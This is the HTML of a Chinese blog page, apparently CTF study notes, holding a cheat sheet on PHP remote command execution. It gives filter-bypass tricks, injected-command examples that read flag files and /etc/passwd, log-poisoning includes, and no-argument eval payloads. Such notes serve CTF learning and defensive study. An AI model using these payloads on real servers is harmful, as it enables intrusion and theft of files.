@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>标签: RCE - UPONのblog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="UPONのblog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="UPONのblog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="UPON-2021の屋子"><meta property="og:url" content="https://upon-2021.github.io/"><meta property="og:site_name" content="UPON-2021の屋子"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://upon-2021.github.io/img/avatar.png"><meta property="article:author" content="UPON-2021"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"xn--upon-eu0gs25bb4r113aow1c.googles.icu"},"headline":"UPONのblog","image":["/img/og_image.png"],"author":{"@type":"Person","name":"UPON2021"},"description":""}</script><link rel="icon" href="/img/favicon.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.0.2"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">标签</a></li><li class="is-active"><a href="#" aria-current="page">RCE</a></li></ul></nav></div></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-03  <a class="commentCountImg" href="/2022/10/03/RCE/#comment-container"><span class="display-none-class">ee3a51b7a6c437e5ede55c93ad7163f2</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="ee3a51b7a6c437e5ede55c93ad7163f2">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>12 分钟  <i class="fas fa-pencil-alt"> </i>1.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/03/RCE/">命令执行备忘录</a></h1><div class="content"><h1 id="0x00-什么是RCE"><a href="#0x00-什么是RCE" class="headerlink" title="0x00 什么是RCE"></a>0x00 什么是RCE</h1><p>RCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<h1 id="0x01-常见命令执行函数"><a href="#0x01-常见命令执行函数" class="headerlink" title="0x01 常见命令执行函数"></a>0x01 常见命令执行函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP代码执行函数：</span><br><span class="line">eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP命令执行函数：</span><br><span class="line">system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()...</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-Bypass"><a href="#0x02-Bypass" class="headerlink" title="0x02 Bypass"></a>0x02 Bypass</h1><h2 id="1-关键词拦截"><a href="#1-关键词拦截" class="headerlink" title="1.关键词拦截:"></a>1.关键词拦截:</h2><ul>
+<li><p>关键词替换为空的情况:</p>
+<ul>
+<li>双写绕过，比如<code>cacatt</code> -&gt; <code>cat</code></li>
+</ul>
+</li>
+<li><p>仅拦截关键字:</p>
+<ul>
+<li><p>使用其他函数，比如拦截<code>cat</code>的时候，可以使用其他命令。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Input</th>
+<th align="left">Ouput</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">static-sh .&#x2F;flag.txt</td>
+<td align="left">.&#x2F;flag.txt: line 1: flag{this_is_a_test}: not found</td>
+</tr>
+<tr>
+<td align="left">paste .&#x2F;flag.txt &#x2F;etc&#x2F;passwd</td>
+<td align="left">flag{this_is_a_test} root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash…</td>
+</tr>
+<tr>
+<td align="left">diff</td>
+<td align="left">diff .&#x2F;flag.txt &#x2F;etc&#x2F;passwd</td>
+</tr>
+<tr>
+<td align="left">curl file:&#x2F;&#x2F;&#x2F;home&#x2F;coffee&#x2F;flag</td>
+<td align="left">flag{this_is_a_test}</td>
+</tr>
+<tr>
+<td align="left">…</td>
+<td align="left">…</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>通配符绕过，比如可以使用<code>/b??/c?t f*</code>。<strong>该方法有时候会因为输出过多或者运行时间超出限制被强行中断</strong></p>
+</li>
+<li><p>插入<code>&quot;&quot;</code> <code>&lt;&gt;</code> <code>&#39;&#39;</code> <code>\</code>绕过,比如<code>ca&#39;&#39;t flag.txt</code>或者<code>ca\t flag.txt</code></p>
+</li>
+<li><p>内联执行，将反引号内命令的输出作为输入执行,如: cat `ls`，或者是<code>cat $&#123;ls&#125;</code></p>
+</li>
+<li><p>使用变量替换，如<code>$c=a;cat fl$cg.php</code></p>
+</li>
+</ul>
+</li>
+<li><p>拦截空格,空格可以用以下字符串代替：</p>
+<blockquote>
+<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等，比如:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt   </span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure></li>
+<li><p><code>.</code>操作符<br>  eval函数中用<code>.</code>把被拦截的关键字给分开，比如</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">include</span> <span class="string">&quot;/www/lo&quot;</span>.<span class="string">&quot;g/nginx/access.log&quot;</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p>逃逸，绕过太难了，直接润出来<br>比如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span> </span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])    </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>借壳生蛋</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">      <span class="title function_ invoke__">putenv</span>(<span class="variable">$env</span>);</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>   ?env&#x3D;BASH_FUNC_whoami%%&#x3D;() { ls; }<br><code>whoami</code>是<code>system(“whoami”)</code>启动的bash环境的函数，相当于我们注册了一个<code>whoami</code>替换它</p>
+</blockquote>
+</li>
+<li><p>构造<br> 在PHP7中，可以这样调用函数:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;phpinfo&#x27;)();</span><br><span class="line">$a = &quot;phpinfo&quot;;$$a;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>  然后就可以使用异或<code>^</code>,取反<code>~</code>，自增<code>++</code>，自减<code>--</code>等方法构造想要的字符然后进行动态函数调用。</p>
+<p>  构造字符的时候，可以利用一些PHP的特性：</p>
+<ul>
+<li><code>PHP中的NAN和INF：</code>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br><span class="line"></span><br><span class="line">$_=C/C;//NAN</span><br><span class="line">$_=1/C//INF</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-无回显"><a href="#2-无回显" class="headerlink" title="2.无回显"></a>2.无回显</h2><ul>
+<li><p>利用<code>sleep()</code>之类的函数来根据服务器响应的时间一个一个字符获获取<br><strong>注:该方法局限性很大，且容易受到网络波动影响，不建议优先考虑使用</strong></p>
+</li>
+<li><p>利用dns外带<code>http://dnslog.cn/</code><br><strong>注:该方法也有一定的局限性，有长度限制而且不支持特殊字符</strong></p>
+</li>
+<li><p>利用重定向，将输出重定向到可访问网页中</p>
+</li>
+<li><p>反弹<code>shell</code><br><strong>如果题目不出网只能寄</strong></p>
+</li>
+<li><p>命令注入,尝试在命令后面加上<code>||</code>、<code>%0a</code>、<code>%0d</code>、<code>|</code>、<code>;</code>、<code>&amp;</code>等符号将原先重定向到<code>/dev/null</code>的命令分割开</p>
+</li>
+</ul>
+<h2 id="3-include"><a href="#3-include" class="headerlink" title="3.include"></a>3.include</h2><ul>
+<li>伪协议</li>
+<li>日志包含<br>UA写马,包含<code>access.log</code></li>
+<li>allow_url_include&#x3D;ture可以使用的data<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data类型扩展:</span><br><span class="line"></span><br><span class="line">  data类型扩展</span><br><span class="line">  data:,&lt;文本数据&gt;</span><br><span class="line">  data:text/plain,&lt;文本数据&gt;</span><br><span class="line">  data:text/html,&lt;HTML代码&gt;</span><br><span class="line">  data:text/html;base64,&lt;base64编码的HTML代码&gt;</span><br><span class="line">  data:text/css,&lt;CSS代码&gt;</span><br><span class="line">  data:text/css;base64,&lt;base64编码的CSS代码&gt;</span><br><span class="line">  data:text/javascript,&lt;Javascript代码&gt;</span><br><span class="line">  data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;</span><br><span class="line">  data:image/gif;base64,base64编码的gif图片数据</span><br><span class="line">  data:image/png;base64,base64编码的png图片数据</span><br><span class="line">  data:image/jpeg;base64,base64编码的jpeg图片数据</span><br><span class="line">  data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>
+<strong>Tips:</strong> PHP具有极强的鲁棒性<del>特别耐操</del>，尤其是伪协议这块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">原payload:php://filter/convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">我可以插♂ 入一些奇怪的东西</span><br><span class="line">php://filter/convert.base64-encode/114514/resource=index.php</span><br><span class="line"></span><br><span class="line">我可以大大小小</span><br><span class="line">php://FiLTer/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="4-无参命令执行"><a href="#4-无参命令执行" class="headerlink" title="4.无参命令执行"></a>4.无参命令执行</h2><p>这种就基本没活能整了，已经十分固定下来了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><code>&#39;/[^\W]+\((?R)?\)/&#39;</code>的解释</p>
+<p>  这里使用pregreplace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;</p>
+<p>  以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p>
+</li>
+<li><p>一些有用的东西</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line"></span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h4><ol>
+<li><p>请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /1.php?code=eval(end(getallheaders())); HTTP/1.1</span><br><span class="line">.....</span><br><span class="line">flag: system(&#x27;id&#x27;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>get_defined_vars()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+<p>利用全局变量进RCE</p>
+</li>
+</ol>
+<p><code>get_defined_vars()</code>：返回由所有已定义变量所组成的数组，会返回  <code>_GET</code>,<code>_POST</code>,  <code>_COOKIE</code>, <code>_FILES</code>全局变量的值，返回数组顺序为<code>get</code>-&gt;<code>post</code>-&gt;<code>cookie</code>-&gt;<code>files</code><br><code>current</code>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</p>
+<p>3.session_start()</p>
+<ul>
+<li><p>session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()</p>
+</li>
+<li><p>session_id()：获取&#x2F;设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。<br>文件读取</p>
+</li>
+<li><p><code>show_source(session_id(session_start()));</code></p>
+</li>
+<li><p><code>var_dump(file_get_contents(session_id(session_start())))</code></p>
+</li>
+<li><p><code>highlight_file(session_id(session_start()));</code></p>
+</li>
+<li><p><code>readfile(session_id(session_start()));</code><br>抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</p>
+</li>
+</ul>
+</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/WEB/">WEB</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/RCE/">RCE</a></div><hr></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="UPON-2021"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">UPON-2021</p><p class="is-size-6 is-block">游走于 web2 &amp; web3 的嘿阔 (很菜)</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">13</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/upon-2021" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/upon-2021/"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/%E8%AF%B6%E5%98%BF%EF%BC%9F"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="/%E5%96%B5%E5%96%B5%E5%96%B5%EF%BC%9F"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
+                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
+                                if(data){
+                                    $('#hitokoto').html("");
+                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
+                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
+                                }});}
+                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.google.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">谷歌</span></span><span class="level-right"><span class="level-item tag">www.google.com</span></span></a></li><li><a class="level is-mobile" href="https://www.baidu.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">百度</span></span><span class="level-right"><span class="level-item tag">www.baidu.com</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟缓存...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-06T02:05:56.986Z">2022-10-06</time></p><p class="title"><a href="/2022/10/06/sql/">SQL注入备忘录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-04T12:45:21.957Z">2022-10-04</time></p><p class="title"><a href="/2022/10/04/solidity/">Ethernaut刷题记录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-02T16:00:00.000Z">2022-10-03</time></p><p class="title"><a href="/2022/10/03/RCE/">命令执行备忘录</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-09-29T16:00:00.000Z">2022-09-30</time></p><p class="title"><a href="/2022/09/30/mt-ctf/">美团CTF决赛复现 mako</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-09-29T08:53:10.840Z">2022-09-29</time></p><p class="title"><a href="/2022/09/29/i-love-hexo/">How sfc9982 helped me solve hexo problem</a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/09/"><span class="level-start"><span class="level-item">九月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WEB/"><span class="tag">WEB</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Blockchain/"><span class="tag">Blockchain</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETH/"><span class="tag">ETH</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Solidity/"><span class="tag">Solidity</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Troubleshooting/"><span class="tag">Troubleshooting</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/inject/"><span class="tag">inject</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/phar/"><span class="tag">phar</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%8D%E7%8E%B0/"><span class="tag">复现</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a><p class="size-small"><span>&copy; 2022 UPON2021</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
+            var n = new Date(time);
+            now.setTime(now.getTime() + 250),
+                days = (now - n) / 1e3 / 60 / 60 / 24,
+                dnum = Math.floor(days),
+                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
+                hnum = Math.floor(hours),
+            1 == String(hnum).length && (hnum = "0" + hnum),
+                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
+                mnum = Math.floor(minutes),
+            1 == String(mnum).length && (mnum = "0" + mnum),
+                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
+                snum = Math.round(seconds),
+            1 == String(snum).length && (snum = "0" + snum),
+                document.getElementById("statistic-times").innerHTML = "本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！";
